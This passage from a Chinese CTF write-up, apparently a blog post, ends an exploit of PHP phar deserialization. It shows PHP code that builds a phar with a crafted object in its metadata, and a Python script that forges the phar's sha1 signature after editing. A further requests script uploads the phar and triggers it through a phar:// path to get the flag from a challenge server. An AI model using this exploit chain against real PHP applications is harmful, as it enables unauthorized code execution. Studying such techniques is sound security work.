id=\"_673\"></a>签名修改</h4>\n<p>我们需要写入</p>\n<pre><code>a:2:{i:0;O:7:\"getflag\":{}i:0;N;}\n</code></pre>\n<p>但是,因为直接得到的序列化字符串是</p>\n<pre><code>a:2:{i:0;O:7:\"getflag\":{}i:1;N;}\n</code></pre>\n<p>所以我们需要将i:1,变为i:0.但是如果直接修改的话会因为签名错误而报错，那么我们可以修改签名.</p>\n<p>通过PHP文档我们找到了Phar签名数据在文件的最后</p>\n<table><thead><tr><th>长度</th><th>内容</th></tr></thead><tbody><tr><td>变长</td><td>签名字节</td></tr><tr><td>4字节</td><td>签名类型，1代表md5，2代表sha1等</td></tr><tr><td>4字节</td><td>GBMB标识</td></tr></tbody></table>\n<p>通过010-editor,查看phar文件签名类型</p>\n<p>先生成phar文件</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">getflag</span><span class=\"token punctuation\">{<!-- --></span>\n\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">getflag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$phar</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Phar</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"phar1.phar\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//后缀名必须为phar</span>\n<span class=\"token variable\">$phar</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">startBuffering</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$phar</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">setStub</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;?php __HALT_COMPILER(); ?&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//设置stub</span>\n<span class=\"token variable\">$phar</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">setMetadata</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token operator\">=&gt;</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token operator\">=&gt;</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//将自定义的meta-data存入manifest</span>\n<span class=\"token variable\">$phar</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">addFromString</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"test.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//添加要压缩的文件</span>\n<span class=\"token comment\">//签名自动计算</span>\n<span class=\"token variable\">$phar</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">stopBuffering</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n\n</code></pre>\n<p>sha1签名为例</p>\n<pre><code class=\"prism language-php\">from hashlib import sha1\nf <span class=\"token operator\">=</span> <span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'./phar1.phar'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'rb'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 修改内容后的phar文件</span>\ns <span class=\"token operator\">=</span> f<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">28</span><span class=\"token punctuation\">]</span> <span class=\"token comment\"># 获取要签名的数据</span>\nh <span class=\"token operator\">=</span> f<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token comment\"># 获取签名类型以及GBMB标识</span>\nnewf <span class=\"token operator\">=</span> s<span class=\"token operator\">+</span><span class=\"token function\">sha1</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">digest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>h <span class=\"token comment\"># 数据 + 签名 + 类型 + GBMB</span>\n<span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'phar2.phar'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'wb'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span>newf<span class=\"token punctuation\">)</span> <span class=\"token comment\"># 写入新文件</span>\n</code></pre>\n<p>得到修改签名后的文件</p>\n<p>跑脚本,传数据</p>\n<pre><code class=\"prism language-python\"><span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">import</span> gzip\n<span class=\"token keyword\">import</span> re\n\nurl <span class=\"token operator\">=</span> <span class=\"token string\">'http://xxx.nss.ctfer.vip:9080/'</span>\n\n<span class=\"token builtin\">file</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"./phar2.phar\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"rb\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#打开文件</span>\nfile_out <span class=\"token operator\">=</span> gzip<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"./phar.zip\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"wb+\"</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#创建压缩文件对象</span>\nfile_out<span class=\"token punctuation\">.</span>writelines<span class=\"token punctuation\">(</span><span class=\"token builtin\">file</span><span class=\"token punctuation\">)</span>\nfile_out<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token builtin\">file</span><span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 先将phar的内容写入/tmp/a.txt,其中file_put_contents相当于文件上传.</span>\nrequests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>\n    url<span class=\"token punctuation\">,</span>\n    params<span class=\"token operator\">=</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token number\">0</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'O:1:\"A\":{s:6:\"config\";s:1:\"w\";}'</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    data<span class=\"token operator\">=</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token number\">0</span><span class=\"token punctuation\">:</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./phar.zip'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">)</span> <span class=\"token comment\"># 写入</span>\n<span class=\"token comment\"># file_get_contents时,就会触发phar反序列化,得到flag</span>\nres <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>\n    url<span class=\"token punctuation\">,</span>\n    params<span class=\"token operator\">=</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token number\">0</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'O:1:\"A\":1:{s:6:\"config\";s:1:\"r\";}'</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    data<span class=\"token operator\">=</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token number\">0</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'phar://tmp/a.txt'</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">)</span> <span class=\"token comment\"># 触发</span>\n\nflag <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span><span class=\"token builtin\">compile</span><span class=\"token punctuation\">(</span><span class=\"token string\">'(NSSCTF\\{.+?\\})'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span>\n</code></pre>\n<p>参考:https://www.ctfer.vip/#/note/set/wp/33</p>\n<h2><a id=\"_773\"></a>参考文献</h2>\n<p>https://y4tacker.blog.csdn.net/article/details/113588692?spm=1001.2014.3001.5502</p>\n<p>https://xz.aliyun.com/t/2715#toc-1</p>\n<p>https://xz.aliyun.com/t/2613</p>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>"}